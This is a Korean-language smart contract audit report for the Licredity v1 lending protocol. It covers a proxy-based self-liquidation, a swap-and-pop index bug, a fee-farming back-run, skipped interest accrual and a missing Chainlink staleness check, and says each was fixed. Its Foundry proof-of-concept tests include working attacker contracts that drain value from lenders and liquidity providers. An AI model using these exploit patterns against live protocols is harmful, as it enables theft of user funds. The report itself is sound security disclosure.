**수석 감사**

[Immeas](https://twitter.com/0ximmeas)

[ChainDefenders](https://x.com/ChDefendersEth) ([0x539](https://x.com/1337web3) & [PeterSR](https://x.com/PeterSRWeb3))

**보조 감사**

[Alexzoid](https://x.com/alexzoid_eth) (정형 검증)

---

# 발견 사항

## 치명적 위험 (Critical Risk)

### 프록시 기반 자체 청산으로 대출자에게 부실 채권 발생

**설명:** 부실 포지션을 청산하기 위해 [`Licredity::seize`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L550-L558)를 호출할 때, 컨트랙트는 포지션 소유자가 호출자가 아닌지 확인합니다:

```solidity
// 소유자가 고의로 포지션을 수중(underwater) 상태로 만든 후 압류하여 이익을 얻는 것을 방지
// 부작용으로 대체 불가능한 포지션 관리자와 같은 소유자 컨트랙트에 의해 포지션이 압류될 수 없지만, 이는 허용 가능함
if (position.owner == msg.sender) {
    assembly ("memory-safe") {
        mstore(0x00, 0x7c474390) // 'CannotSeizeOwnPosition()'
        revert(0x1c, 0x04)
    }
}
```

이 확인은 별도의 컨트랙트를 통해 `seize`를 호출함으로써 우회할 수 있습니다. 포지션 소유자는 도우미("프록시") 컨트랙트를 통해 청산을 조정하여 `Licredity::seize`의 `msg.sender`가 소유자가 아닌 프록시가 되도록 합니다. 공격자는 `Licredity::unlock`과 그 콜백을 사용하여 포지션을 열고 담보 부족 상태로 만든 다음 동일한 트랜잭션에서 즉시 자체 청산하여 손실을 대출자에게 떠넘길 수 있습니다.

**파급력:** 소유자는 자신의 담보 부족 포지션을 청산하고 청산 보너스를 획득하는 동시에 부족분을 대출자/프로토콜에게 떠넘길 수 있습니다. 이는 원자적으로 수행될 수 있고, 인센티브를 파밍하기 위해 반복될 수 있으며, 가용 유동성 및 구성 한도까지 확장될 수 있습니다. 가격 변동이 필요하지 않으므로 프로토콜 가치를 실질적으로 고갈시킬 수 있습니다.

**개념 증명 (Proof of Concept):** `LicreditySeize.t.sol`에 다음 테스트를 추가하십시오. 이는 공격자가 `AttackerRouter`와 `AttackerSeizer`를 배포하여 부실 포지션을 열고 동일한 `unlock` 호출에서 즉시 자체 청산하는 방법을 보여줍니다:
```solidity
function test_seize_ownPosition_using_external_contract() public {
    /// 기존 대출자를 위해 대규모 포지션 개설
    uint256 positionId = licredityRouter.open();
    token.mint(address(this), 10 ether);
    token.approve(address(licredityRouter), 10 ether);

    licredityRouter.depositFungible(positionId, Fungible.wrap(address(token)), 10 ether);

    uint128 borrowAmount = 9 ether;
    (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
    uint256 delta = borrowAmount.toShares(totalAssets, totalShares);

    licredityRouterHelper.addDebt(positionId, delta, address(1));

    // 공격자는 포지션을 압류하기 위해 라우터와 도우미 컨트랙트 배포
    AttackerSeizer seizer = new AttackerSeizer(licredity);
    AttackerRouter attackerRouter = new AttackerRouter(licredity, token, seizer);

    // 공격 시작
    attackerRouter.depositFungible(0.5 ether);
}
```
그리고 사용된 다음 두 컨트랙트를 추가하십시오:
```solidity
contract AttackerRouter {
    using StateLibrary for Licredity;
    using ShareMath for uint128;

    Licredity public licredity;
    BaseERC20Mock public token;
    AttackerSeizer public seizer;

    constructor(Licredity _licredity, BaseERC20Mock _token, AttackerSeizer _seizer) {
        licredity = _licredity;
        token = _token;
        seizer = _seizer;
    }

    function depositFungible(uint256 amount) external {
        // 1. 포지션에 일부 담보 추가
        //    압류 후 건강해질 수 있도록 함
        uint256 positionId = licredity.open();
        licredity.stageFungible(Fungible.wrap(address(token)));
        token.mint(address(licredity), amount);
        licredity.depositFungible(positionId);

        // 2. 부채를 떠안고 압류하기 위해 unlock 호출
        licredity.unlock(abi.encode(positionId));
        // 5. `unlock`이 revert되지 않으므로 포지션이 건강해짐
    }

    function unlockCallback(bytes calldata data) public returns (bytes memory) {
        uint256 positionId = abi.decode(data, (uint256));

        // 3. 부채 지분을 늘려 포지션을 부실하게 만듦
        uint128 borrowAmount = 1 ether;
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        uint256 delta = borrowAmount.toShares(totalAssets, totalShares);
        licredity.increaseDebtShare(positionId, delta, address(this));

        // 4. 별도의 압류자(seizer) 컨트랙트를 사용하여 포지션 압류
        //    다시 건강하게 만듦.
        seizer.seize(positionId);

        return new bytes(0);
    }
}

contract AttackerSeizer {
    Licredity public licredity;

    constructor(Licredity _licredity) {
        licredity = _licredity;
    }

    function seize(uint256 positionId) external {
        licredity.seize(positionId, msg.sender);
    }
}
```

**권장 완화 방법:** `position.owner != msg.sender`를 강제하는 것 외에도, `seize`가 `unlock` 실행의 첫 번째 작업이어야 하도록 제한하십시오. `Locker` 라이브러리는 이미 포지션이 이전에 건드려졌는지 여부를 추적하므로 이를 `seize`에 노출할 수 있습니다. 그리고 포지션이 건드려졌다면 revert하십시오. 이는 Euler의 EVC/EVK 콤보가 원자적 "생성/차입/자체 청산" 흐름을 차단하기 위해 사용하는 접근 방식을 반영합니다 ([코드](https://github.com/euler-xyz/euler-vault-kit/blob/master/src/EVault/modules/Liquidation.sol#L93-L95)).

**Licredity:** [PR#57](https://github.com/Licredity/licredity-v1-core/pull/57/files)의 커밋 [`e9490bb`](https://github.com/Licredity/licredity-v1-core/commit/e9490bb3f82fdd829288a76af5d421c10570e6ba)에서 수정되었습니다.

**Cyfrin:** 확인됨. `seize`는 이제 `Locker`에 동일한 포지션의 이전 등록이 없는지 확인합니다.

### 인덱스 수정 없는 Swap-and-pop으로 인한 `Position`의 대체 가능(fungible) 배열 손상

**설명:** [`Position`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/types/Position.sol#L10-L16)은 대체 가능 담보를 **두 곳**에서 추적하며 이들은 동기화 상태를 유지해야 합니다:

```solidity
struct Position {
    address owner;
    uint256 debtShare;
    Fungible[] fungibles;                       // 보유 자산의 컴팩트 리스트
    NonFungible[] nonFungibles;
    mapping(Fungible => FungibleState) fungibleStates; // 자산별 {인덱스, 잔액}
}
```

불변식(Invariant): `fungibles[k]`에 있는 모든 자산 `a`에 대해 `fungibleStates[a].index == k+1`이어야 합니다(라이브러리는 1 기반 인덱스를 사용하며, `index == 0`은 "존재하지 않음"을 의미).

자산의 잔액이 0이 되면, [`Position::removeFungible`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/types/Position.sol#L70-L114)은 "swap-and-pop"을 시도합니다. 즉, 마지막 배열 요소를 제거된 슬롯으로 이동하고 배열을 축소합니다. 코드는 배열 이동을 수행하지만 `fungibleStates`에서 이동된 요소의 캐시된 인덱스를 업데이트하는 것을 잊어버립니다:

```solidity
// remove a fungible from the fungibles array
assembly ("memory-safe") {
    let slot := add(self.slot, FUNGIBLES_OFFSET)
    let len := sload(slot)
    mstore(0x00, slot)
    let dataSlot := keccak256(0x00, 0x20)

    if iszero(eq(index, len)) {
        // 제거된 슬롯을 마지막 요소로 덮어씀 (swap)
        sstore(add(dataSlot, sub(index, 1)), sload(add(dataSlot, sub(len, 1))))
    }

    // pop
    sstore(add(dataSlot, sub(len, 1)), 0)
    sstore(slot, sub(len, 1))
}
```

누락된 것은 꼬리(tail)에서 아래로 이동된 요소에 대한 인덱스 수정입니다. 이것이 없으면 `fungibleStates[moved].index`는 여전히 이전 꼬리 인덱스를 가리킵니다.

이것이 상태를 손상시키는 이유:

1. `fungibles = [A, B, C]`이고 다음 상태로 시작합니다:

   ```
   index(A)=1, index(B)=2, index(C)=3
   ```
2. `A` (index=1)를 제거합니다. 코드는 마지막 요소 `C`를 슬롯 0으로 복사하고 배열을 팝(pop)합니다:

   ```
   fungibles = [C, B], length=2
   ```

   그러나 `index(C)`는 여전히 3입니다(오래됨).
3. 나중에 `C`를 제거합니다. 함수는 오래된 `index(C)=3`을 신뢰합니다:

   * `index=3` 및 `len=2`를 사용하여 "swap-and-pop"을 시도합니다. 이는 `B`를 슬롯 `index-1 = 2` (새 끝을 지남)로 복사하고, 슬롯 1을 팝합니다.
   * 순 효과: `B`는 활성 배열에서 조용히 사라지며 (`length`는 1이 되고 `fungibles[0]`은 여전히 `C`일 수 있음), `fungibleStates[B]`는 여전히 양의 잔액을 표시합니다.

이로 인해 배열과 매핑 간의 비동기화가 발생하여 다음과 같은 결과가 초래됩니다:

* "X를 제거하지만 실제로 Y를 잃음" 동작 (잘못된 요소가 사라짐).
* 배열에 표시되지 않는 "유령" 잔액이 매핑에 남음 (`fungibles`를 반복하는 평가(appraisal)가 가치를 과소 계산).
* 오래된 인덱스를 사용하는 향후 제거/작업이 잘못된 슬롯을 읽거나 씁니다.

**파급력**

* `fungibles[]`와 `fungibleStates` 간의 불일치 상태 (오래되거나 중복된 인덱스).
* 토큰 `X`를 제거하면 예기치 않게 토큰 `Y`가 배열에서 제거될 수 있습니다.
* 열거 기반 로직(예: `fungibles[]`를 반복하는 평가/감정)이 포지션을 과소 또는 과대 계산하여 잘못된 건강/회계 결정으로 이어질 수 있습니다.

**개념 증명 (Proof of Concept):** 다음 테스트 및 도우미 함수를 `LicredityUnlockPosition.t.sol`에 배치하십시오:
```solidity
function test_removeFungible_missingIndexFixup() public {
    BaseERC20Mock token = _newAsset(18);
    Fungible fungible = Fungible.wrap(address(token));
    // --- 준비: 동일한 포지션에 두 개의 대체 가능 자산 ---
    token.mint(address(this), 1 ether);
    token.approve(address(licredityRouter), 1 ether);

    uint256 positionId = licredityRouter.open();

    // 네이티브 예금 (fungibles[0]이 됨)
    licredityRouter.depositFungible{value: 0.5 ether}(positionId, Fungible.wrap(ChainInfo.NATIVE), 0.5 ether);

    // ERC20 예금 (fungibles[1]이 됨)
    licredityRouter.depositFungible(positionId, fungible, 1 ether);

    // --- 필요한 스토리지 슬롯 발견 (테스트당 한 번이면 족함) ---
    // 다음을 찾습니다:
    //  - positions[positionId]의 기본 슬롯 (self.slot)
    //  - fungibleStates 매핑 기본 슬롯: self.slot + FUNGIBLE_STATES_OFFSET
    //  - fungibles 배열 슬롯: self.slot + FUNGIBLES_OFFSET
    (
        ,
        uint256 fungibleStatesBase,
        uint256 fungiblesArraySlot
    ) = _locatePositionFungibleStateAndArraySlots(positionId, address(licredity), address(token));

    // 정상 확인: 배열 길이는 2여야 함
    uint256 lenBefore = uint256(vm.load(address(licredity), bytes32(fungiblesArraySlot)));
    assertEq(lenBefore, 2, "pre: fungibles length should be 2");

    // ERC20에 대한 압축된 FungibleState 워드 미리 읽기 (인덱스 + 잔액 포함)
    bytes32 stateBefore = _loadFungibleState(
        address(licredity),
        fungibleStatesBase,
        address(token)
    );

    // 또한 배열의 첫 번째 요소(네이티브여야 함)와 두 번째 요소(ERC20이어야 함) 읽기
    bytes32 dataSlot = keccak256(abi.encodePacked(bytes32(fungiblesArraySlot)));
    bytes32 arr0Before = vm.load(address(licredity), dataSlot);                 // [0]
    bytes32 arr1Before = vm.load(address(licredity), bytes32(uint256(dataSlot) + 1)); // [1]
    assertEq(address(uint160(uint256(arr0Before))), address(0), "pre: [0] must be native");
    assertEq(address(uint160(uint256(arr1Before))), address(token), "pre: [1] must be ERC20");

    // --- 실행: 마지막이 아닌 대체 가능 자산(네이티브)을 완전히 제거 -> swap-and-pop 트리거 ---
    licredityRouterHelper.withdrawFungible(positionId, address(this), ChainInfo.NATIVE, 0.5 ether);

    // --- 검증: 배열 요소가 아래로 이동했지만, ERC20의 상태 워드가 변경되지 않음 (인덱스 미수정) ---

    // 배열 길이가 1로 감소
    uint256 lenAfter = uint256(vm.load(address(licredity), bytes32(fungiblesArraySlot)));
    assertEq(lenAfter, 1, "post: fungibles length should be 1");

    // array[0]은 이제 ERC20 주소를 보유해야 함 (인덱스 1 -> 0으로 이동)
    bytes32 arr0After = vm.load(address(licredity), dataSlot);
    assertEq(address(uint160(uint256(arr0After))), address(token), "post: [0] must be ERC20");

    // ERC20의 압축된 상태 다시 읽기
    bytes32 stateAfter = _loadFungibleState(
        address(licredity),
        fungibleStatesBase,
        address(token)
    );

    // NATIVE를 완전히 제거하고 ERC20 잔액을 건드리지 않았으므로,
    // 올바른 구현은 워드 내의 ERC20 *인덱스*만 변경해야 합니다.
    // 코드가 인덱스를 수정하지 않으므로 워드는 동일하게 유지됩니다.
    assertEq(stateAfter, stateBefore, "post: ERC20 FungibleState word unchanged (index not fixed up)");
}

// 스토리지 조사하여 (self.slot, self.slot + FUNGIBLE_STATES_OFFSET, self.slot + FUNGIBLES_OFFSET) 찾기.
// 휴리스틱: 두 번의 예금 후 fungibles 배열 길이는 2이고
// 두 키(네이티브, 토큰)에 대한 fungibleStates 매핑은 0이 아님.
function _locatePositionFungibleStateAndArraySlots(
    uint256 positionId,
    address target,
    address erc20
)
    internal
    view
    returns (uint256 selfSlot, uint256 fungibleStatesBase, uint256 fungiblesArraySlot)
{
    // positions는 일부 슬롯 S에서의 매핑입니다. Position 구조체는 keccak256(positionId, S)에 있습니다.
    // 두 하위 구조체에 대해 S∈[0..160] 및 오프셋 off∈[0..24]를 검색합니다.
    for (uint256 S = 0; S <= 160; S++) {
        bytes32 self = keccak256(abi.encode(positionId, S));

        // 두 키가 모두 0이 아닌지 확인하여 매핑 기준(self + offMap) 찾기 시도
        for (uint256 offMap = 0; offMap <= 24; offMap++) {
            uint256 candMapBase = uint256(self) + offMap;

            bytes32 nativeState = _loadFungibleState(target, candMapBase, address(0));
            bytes32 erc20State  = _loadFungibleState(target, candMapBase, erc20);

            if (nativeState != bytes32(0) && erc20State != bytes32(0)) {
                // 이제 길이가 2인 배열 슬롯(self + offArr) 찾기
                for (uint256 offArr = 0; offArr <= 24; offArr++) {
                    uint256 candArrSlot = uint256(self) + offArr;
                    uint256 len = uint256(vm.load(target, bytes32(candArrSlot)));
                    if (len == 2) {
                        // 배열 내용이 [native, erc20]처럼 보이는지 이중 확인
                        bytes32 dataSlot = keccak256(abi.encodePacked(bytes32(candArrSlot)));
                        address a0 = address(uint160(uint256(vm.load(target, dataSlot))));
                        address a1 = address(
                            uint160(uint256(vm.load(target, bytes32(uint256(dataSlot) + 1))))
                        );
                        if (a0 == address(0) && a1 == erc20) {
                            return (uint256(self), candMapBase, candArrSlot);
                        }
                    }
                }
            }
        }
    }
    revert("could not locate position/fungible storage layout");
}

function _loadFungibleState(address target, uint256 mapBaseSlot, address asset)
    internal
    view
    returns (bytes32)
{
    // 매핑 스토리지 키: keccak256(abi.encode(key, slot))
    bytes32 key = keccak256(
        abi.encodePacked(bytes32(uint256(uint160(asset))), bytes32(mapBaseSlot))
    );
    return vm.load(target, key);
}

receive() external payable {}
```

**권장 완화 방법:** `index`가 이동된 항목을 가리키도록 업데이트하십시오:
```solidity
// (개념적으로)
Fungible moved = fungibles[len-1];
fungibles[index-1] = moved;
fungibles.pop();

// 이동된 요소에 대해 캐시된 인덱스 수정
fungibleStates[moved].index = index;  // 1-based
```

**Licredity:** [PR#64](https://github.com/Licredity/licredity-v1-core/pull/64/files)의 커밋 [`ad095fc`](https://github.com/Licredity/licredity-v1-core/commit/ad095fc6d2de3f61f6c48ddfe60b98eff410f50d)에서 수정되었습니다.

**Cyfrin:** 확인됨. 인덱스가 이제 업데이트됩니다.

\clearpage
## 높은 위험 (High Risk)

### `Licredity::_afterSwap`의 자체 트리거 백런(back-run)으로 LP 수수료 파밍 가능

**설명:** 가격이 1이 되거나 그 아래로 떨어지면, [`Licredity::_afterSwap`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L734-L753)은 가격을 올리기 위해 자동으로 스왑을 백런(back-run)합니다:
```solidity
if (sqrtPriceX96 <= ONE_SQRT_PRICE_X96) {
    // 수수료를 고려하여 exactOut을 사용, 현재 스왑의 효과를 되돌리기 위해 백런 스왑
    IPoolManager.SwapParams memory params =
        IPoolManager.SwapParams(false, -balanceDelta.amount0(), MAX_SQRT_PRICE_X96 - 1);
    balanceDelta = poolManager.swap(poolKey, params, "");
```
해당 백런은 LP에게 스왑 수수료를 지불합니다. 1 주변 유동성의 대부분을 제공하는 공격자는 다음을 수행할 수 있습니다:

1. 스왑으로 가격을 1보다 약간 아래로 밀어내고 딥(dip) 동안 자신의 스왑 수수료를 LP 수수료로 다시 획득합니다.
2. 훅의 백런을 트리거하고 LP 수수료를 다시 획득합니다.
3. `Licredity::exchangeFungible`을 통해 ~1:1로 상환하여 (`baseAmountAvailable` / `debtAmountOutstanding` 사용), 두 수수료 구간(fee legs)을 유지하면서 원금을 회수합니다. 이는 동일한 계정으로 반복될 수 있습니다.

**파급력:** 지배적인 LP는 낮은 가격 위험으로 반복적으로 수수료를 채굴하여 거래자와 시스템의 안정화 로직에서 가치를 고갈시킬 수 있습니다. 시간이 지남에 따라 공격자가 가격을 1 바로 아래로 조종할 수 있을 때마다 꾸준하고 반복 가능한 추출(경제적 고갈)이 됩니다.

**개념 증명 (Proof of Concept):** `LicredityHook.t.sol`에 다음 테스트를 추가하십시오:
```solidity
function test_abuse_backswap_fees() public {
    address attacker = makeAddr("attacker");

    // 공격자에게 ETH 자금을 지원하고 LP 포지션을 위해 부채(debt)를 민팅
    vm.deal(attacker, 1000 ether);
    getDebtERC20(attacker, 50 ether);

    vm.startPrank(attacker);
    IERC20(address(licredity)).approve(address(uniswapV4Router), type(uint256).max);

    // 1) 공격자는 1 주변의 양쪽 모두에 지배적인 좁은 유동성을 추가합니다:
    //    1 미만 -> 가격이 하락하는 동안 수수료 획득 (푸시 구간 + 백런 구간)
    //    1 초과 -> 교차할 때 1 바로 위에서 지불된 수수료의 아주 작은 부분을 회수
    int256 L_below = 40_000 ether;
    int256 L_above = 10_000 ether;

    // 공격 전 공격자 잔액 기록
    uint256 baseBefore = attacker.balance;
    uint256 debtBefore = IERC20(address(licredity)).balanceOf(attacker);

    // 1 미만: [-2, 0]
    uniswapV4RouterHelper.addLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: -2,
            tickUpper:  0,
            liquidityDelta: L_below,
            salt: ""
        })
    );

    // 1 초과: [0, +2]
    payable(address(uniswapV4Router)).transfer(1 ether);
    uniswapV4RouterHelper.addLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: 0,
            tickUpper: 2,
            liquidityDelta: L_above,
            salt: ""
        })
    );
    vm.stopPrank();

    // 2) 시작 가격이 1보다 약간 크도록 하여 푸시에서 1을 통과해 내려가도록 보장합니다.
    //    가격을 올리기 위해 아주 작은 oneForZero (debt -> base)를 수행합니다.
    uniswapV4RouterHelper.oneForZeroSwap(
        attacker,
        poolKey,
        IPoolManager.SwapParams({
            zeroForOne: false,                        // debt -> base
            amountSpecified: int256(0.001 ether),     // exact-in (아주 작음)
            sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(3)
        })
    );
    {
        (uint160 sqrtP0,,,) = poolManager.getSlot0(poolKey.toId());
        assertGt(sqrtP0, ONE_SQRT_PRICE_X96, "price should start slightly > 1");
    }

    vm.startPrank(attacker);
    // 3) 공격자가 푸시를 수행합니다: base -> debt (zeroForOne), exact-out debt,
    //    가격이 1 이하로 교차하고 훅의 백런을 트리거하도록 1 바로 아래 한도로 설정합니다.
    int256 debtOut = 2 ether;
    for(uint256 i = 0 ; i < 1 ; i++) {
        payable(address(uniswapV4Router)).transfer(uint256(debtOut));
        uniswapV4RouterHelper.zeroForOneSwap(
            attacker,
            poolKey,
            IPoolManager.SwapParams({
                zeroForOne: true,                              // base -> debt
                amountSpecified: -debtOut,                     // exact-out debt
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(-3)
            })
        );
    }
    // 훅의 백런 (debt -> base, exact-out base)은 afterSwap 내부에서 실행됩니다.

    // 훅의 백런에 의해 가격이 1 이상으로 복구되어야 합니다.
    {
        (uint160 sqrtP1,,,) = poolManager.getSlot0(poolKey.toId());
        assertGe(sqrtP1, ONE_SQRT_PRICE_X96, "post back-run price must be >= 1");
    }

    // 4) 수수료 회수: base + debt 수수료를 징수하기 위해 양쪽 공격자 포지션을 모두 제거합니다.
    uniswapV4RouterHelper.removeLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: -2,
            tickUpper:  0,
            liquidityDelta: -L_below,
            salt: ""
        })
    );
    uniswapV4RouterHelper.removeLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: 0,
            tickUpper: 2,
            liquidityDelta: -L_above,
            salt: ""
        })
    );
    vm.stopPrank();

    // 공격 후 공격자 잔액
    uint256 baseAfter = attacker.balance;
    uint256 debtAfter = IERC20(address(licredity)).balanceOf(attacker);

    // 5) 두 구간의 가치를 동등하게 평가 (~1 debt ~= 1 base). 가격이 ~1이므로,
    //    이 명목상 비교는 수수료 채굴 이익에 대한 좋은 대리 지표입니다.
    uint256 notionalBefore = baseBefore + debtBefore;
    uint256 notionalAfter  = baseAfter  + debtAfter;

    // 다음으로 인한 긍정적인 드리프트를 예상합니다:
    //  - 테이커 수수료의 거의 100% 회수 (공격자가 1 주변 양쪽을 지배함)
    //  - 1 미만에서 캡처된 백런 수수료 (부채로 지불됨) 추가
    assertGt(notionalAfter, notionalBefore, "drain should be profitable when attacker dominates both sides");
    console.log("Profit from fee mining drain: %s", notionalAfter - notionalBefore);
}
```

**권장 완화 방법:** 다음 옵션 중 하나를 고려하십시오:
1. 백런을 제거하고 1 미만으로 끝나는 스왑을 revert하거나, 1 미만의 `sqrtPriceLimitX96`을 거부하십시오.
2. 화이트리스트에 등록된 주소만 1 미만의 틱에 유동성을 제공할 수 있도록 허용하십시오.
3. 훅에서 동적 수수료를 사용하고 백런에 대해서는 수수료를 발생시키지 마십시오 (즉 `sender == address(this)`).

**Licredity:** [PR#61](https://github.com/Licredity/licredity-v1-core/pull/61/files) 및 [PR#78](https://github.com/Licredity/licredity-v1-core/pull/78/files)의 커밋 [`ddee552`](https://github.com/Licredity/licredity-v1-core/commit/ddee552ce5c1343ed0de1630776655f5313324bb), [`f10c969`](https://github.com/Licredity/licredity-v1-core/commit/f10c969621b2228bee0838ccf3fd597b8b51cef3), [`d8522f8`](https://github.com/Licredity/licredity-v1-core/commit/d8522f8a5b656791536bd87142b2a553ea0b8def), [`039eb4a`](https://github.com/Licredity/licredity-v1-core/commit/039eb4ab5f5c1775d889c9465dde39d22902f583), [`f818f33`](https://github.com/Licredity/licredity-v1-core/commit/f818f335a1f023cac450af4560baf1f0c75c1334), [`0baca20`](https://github.com/Licredity/licredity-v1-core/commit/0baca209b1cfee61d92b0bde11a1cdf99d2436fe)에서 수정되었습니다.

**Cyfrin:** 확인됨. 가격이 1 미만으로 끝나는 스왑은 이제 revert됩니다. `exchangeFungible` 또한 컨트랙트에 교환 가능한 금액이 있는 한 항상 1:1 환율을 제공하도록 변경되었습니다.

### `Licredity::decreaseDebtShare`가 이자 발생을 우회함

**설명:** 대출자는 [`Licredity::decreaseDebtShare`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L472-L536)를 호출하여 대출을 상환할 수 있습니다. 이 호출은 부채만 줄일 수 있기 때문에 "안전"한 것으로 취급되며 [`Licredity::unlock`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L86-L110) 흐름 밖에서 허용됩니다. 그러나 이자는 [`unlock`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L89-L90), [`swap`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L713), 유동성 [추가](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L670)/[제거](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L698) 작업 중에만 발생합니다. 따라서 `decreaseDebtShare`를 직접 호출하면 이자를 먼저 발생시키지 않고 마지막 `totalDebtBalance/totalDebtShare`를 사용하므로 상환은 오래된 상태에서 계산됩니다.

**파급력:** 대출자는 직접 호출을 통해 상환할 때 발생한 이자를 지불하지 않아 LP의 수익률과 프로토콜 수익을 감소시킬 수 있습니다. 다른 참여자가 훅을 트리거할 때(예: 차입/거래/LP 조치) 이자가 여전히 발생하지만, 그러한 이벤트 전에 실행된 상환은 대출자의 이자 분담분을 효과적으로 건너뜁니다. 비록 의도치 않았고 활성 시장에서 타이밍을 맞추기 어렵더라도, 이는 실현된 이자를 낮추고 회계를 왜곡하며 순 APY를 감소시킵니다.

**개념 증명 (Proof of Concept):** `LicredityUnlockPosition.t.sol`에 다음 테스트를 추가하십시오:
```solidity
function test_decraseDebtBalance_doesntAccrueInterest() public {
    uint256 positionId = licredityRouter.open();
    licredityRouter.depositFungible{value: 10e8}(positionId, Fungible.wrap(ChainInfo.NATIVE), 10e8);

    uint256 delta = 1e8 * 1e6;

    licredityRouterHelper.addDebt(positionId, delta, address(this));
    uint256 amountBorrowed = licredity.balanceOf(address(this));

    // 이자 발생 유발
    oracleMock.setQuotePrice(2 ether);
    vm.warp(block.timestamp + 180 days);

    // 부채 지분 감소 호출은 licredity에 직접 수행됨
    // 이자를 발생시키는 `unlock` 컨텍스트 회피
    uint256 amountRepaid = licredity.decreaseDebtShare(positionId, delta, false);

    // 이자가 발생하지 않음
    assertEq(amountRepaid, amountBorrowed);
}
```

**권장 완화 방법:** `decreaseDebtShare` 시작 부분에서 이자를 발생시키거나(pull accrual) `decreaseDebtShare`가 `unlock` 컨텍스트 내에서만 호출 가능하도록 요구하십시오.

**Licredity:** [PR#59](https://github.com/Licredity/licredity-v1-core/pull/59/files)의 커밋 [`8ca2a35`](https://github.com/Licredity/licredity-v1-core/commit/8ca2a35e2af1db4e0ae2f92c779df96f42d18286) 및 [`81e54c0`](https://github.com/Licredity/licredity-v1-core/commit/81e54c0e62a5cda990e715061d099b03e9632d04)에서 수정되었습니다.

**Cyfrin:** 확인됨. 이제 `decreaseDebtShare`에서 이자가 발생합니다.

\clearpage
## 중간 위험 (Medium Risk)

### Chainlink 오라클 최신성(staleness) 확인 누락

**설명:** `ChainlinkFeedLibrary`의 `getPrice` 함수는 `latestRoundData`를 사용하여 Chainlink 피드에서 최신 가격을 가져오지만, 반환된 데이터가 오래되었는지(stale) 확인하지 않습니다. 상당 기간 동안 새로운 가격 업데이트가 발생하지 않으면 Chainlink 피드가 오래될 수 있으며, 이로 인해 프로토콜에서 오래되거나 부정확한 가격 정보를 사용할 수 있습니다. Chainlink 인터페이스는 소비자가 오래되거나 불완전한 데이터를 감지하는 데 도움이 되는 `updatedAt` 및 `answeredInRound` 필드를 제공하지만, 현재 구현에서는 이를 무시합니다.

**파급력:** 프로토콜이 오래되거나 낡은 가격 데이터를 사용하여 잘못된 평가, 증거금 계산 또는 기타 중요한 로직을 초래할 수 있습니다. 공격자가 피드 지연 기간을 조작하거나 예측할 수 있는 경우 이를 악용할 수 있습니다. 사용자 및 통합자는 오래된 가격 정보에 의존하여 증가된 위험에 노출될 수 있습니다.

**개념 증명 (Proof of Concept):** `./oracle/test/` 폴더에 `ChainlinkFeedLibraryTest.t.sol` 파일을 추가하십시오:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ChainlinkFeedLibrary} from "./../src/libraries/ChainlinkFeedLibrary.sol";
import {AggregatorV3Interface} from "./../src/interfaces/external/AggregatorV3Interface.sol";

contract ChainlinkFeedLibraryTest is Test {
    address internal constant MOCK_FEED = address(0xFEED);

    function test_getPrice_acceptsStaleData() public {
        vm.warp(block.timestamp + 10 days); // 블록 타임스탬프를 10일 미래로 설정

        // Chainlink 피드를 모의하여 가격을 반환하지만 오래된 타임스탬프 사용 (예: 1일 전 업데이트)
        // 안전한 구현에서는 지연으로 인해 revert되어야 하지만, 여기서는 그렇지 않음
        vm.mockCall(
            MOCK_FEED,
            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
            abi.encode(
                uint80(1),                  // roundId
                int256(100e8),              // answer
                uint256(0),                 // startedAt (사용 안 함)
                block.timestamp - 1 days,   // updatedAt (오래됨)
                uint80(1)                   // answeredInRound
            )
        );

        // getPrice 호출; revert 없이 오래된 가격을 반환해야 함
        uint256 price = ChainlinkFeedLibrary.getPrice(AggregatorV3Interface(MOCK_FEED));

        // 오래된 가격이 반환되었는지 확인
        assertEq(price, 100e8);
    }
}
```

**권장 완화 방법:** `getPrice` 함수에 최신성 확인을 구현하십시오. 예를 들어, `updatedAt`이 허용 가능한 시간 창 내에 있고(예: 구성 가능한 임계값보다 오래되지 않음) `answeredInRound >= roundId`인지 요구하십시오. 데이터가 오래된 경우 revert하거나 오류를 반환하십시오. 예시 확인:

```solidity
(uint80 roundId, int256 answer,, uint256 updatedAt, uint80 answeredInRound) = feed.latestRoundData();
require(updatedAt >= block.timestamp - MAX_STALENESS, "Chainlink: stale price");
require(answeredInRound >= roundId, "Chainlink: incomplete round");
```

여기서 `MAX_STALENESS`는 프로토콜에서 설정한 합리적인 시간 임계값입니다.

**Licredity:** [PR#18](https://github.com/Licredity/licredity-v1-oracle/pull/18/files)의 커밋 [`5a615c0`](https://github.com/Licredity/licredity-v1-oracle/commit/5a615c0eabd71597931680c4321eb6209d29eb8c)에서 수정되었습니다.

**Cyfrin:** 확인됨. `governor`가 업데이트할 수 있는 `maxStaleness` 필드가 `ChainlinkOracleConfig`에 추가되었습니다.

\clearpage
## 낮은 위험 (Low Risk)

### 제로 가격으로 초기화 시 클램핑(clamping)으로 인한 영구적인 고착 상태 발생 가능

